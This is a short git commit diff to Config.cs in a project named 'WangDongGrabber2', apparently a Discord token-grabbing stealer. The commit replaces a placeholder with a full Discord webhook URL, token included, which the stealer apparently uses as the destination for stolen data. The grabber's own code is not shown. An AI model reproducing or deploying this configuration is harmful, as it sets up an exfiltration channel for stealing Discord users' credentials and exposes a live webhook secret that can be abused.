db4c572f860618ebbd1c212c20336643b680f3ff
LuvDank <93556412+LuvDank@users.noreply.github.com>
2021-11-03 19:03:13 -0500

    Update Config.cs

--- WangDongGrabber2/Config.cs
+++ WangDongGrabber2/Config.cs
@@ -2,7 +2,7 @@
 {
     class Config
     {
-        public static string your_hook = @"YOUR WEBHOOK URL";
+        public static string your_hook = @"https://discord.com/api/webhooks/905607968404422738/vRsPZlnFyvlp9cDDvGEVQWeQ6bx97INtnT-Uu_fOGUDc0npJ2bpsvnImy4O0yqBEkOPc";
         // See Program.cs:33 for more info.
         /*public static bool restartDiscord = true;*/
     }
